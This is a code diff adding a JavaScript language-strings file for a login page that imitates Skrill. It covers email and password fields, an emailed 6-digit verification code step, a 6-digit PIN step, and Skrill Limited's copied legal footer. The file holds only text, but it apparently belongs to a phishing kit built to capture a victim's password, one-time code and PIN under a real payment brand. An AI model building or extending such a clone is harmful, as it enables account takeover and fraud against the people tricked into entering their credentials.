@@ -1,1 +1,41 @@
-osama
+const lang={
+    main:{
+        title:'Log in to your Skrill account',
+        dont:"Don't have an account? ",
+        register:'Register',
+        email:'Email',
+        pass:'Password',
+        button:'Log in',
+        forgot:'Forgot your password?'
+    },
+
+    email:{
+        auth:'Authentication',
+        step:'Step 1 of 2',
+        title:'Check your email',
+        p1:'A 6-digit verification code has been sent to',
+        p2:'Enter it below.',
+        label:'Verification code *',
+        time1:'Your code will be active for ',
+        time2:'Minutes',
+        code:'Send new code',
+        button:'CONTINUE'
+    },
+    pin:{
+        step:'Step 2 of 2',
+        title:'Enter your PIN',
+        p1:'Enter your 6-digit PIN to continue log in.',
+        p2:'What is this?',
+        forgot:"Don't ask me again on this device",
+        button:"LOG IN"
+    },
+
+    privace:{
+        privacy:'Privacy Notice | Cookies Notice | Cookies Settings',
+
+        p:'Skrill Limited. Registered in England and Wales. Company Number: 4260907 Headquarters: 27th Floor, 25 Canada Square, Canary Wharf, London, E14 5LQ, United Kingdom Skrill Limited (FRN: 900001) is authorised by the Financial Conduct Authority under the Electronic Money Regulations 2011 for the issuing of electronic money and payment instruments. Skrill is a registered trademark of Skrill Limited.'
+
+    }
+
+ 
+}
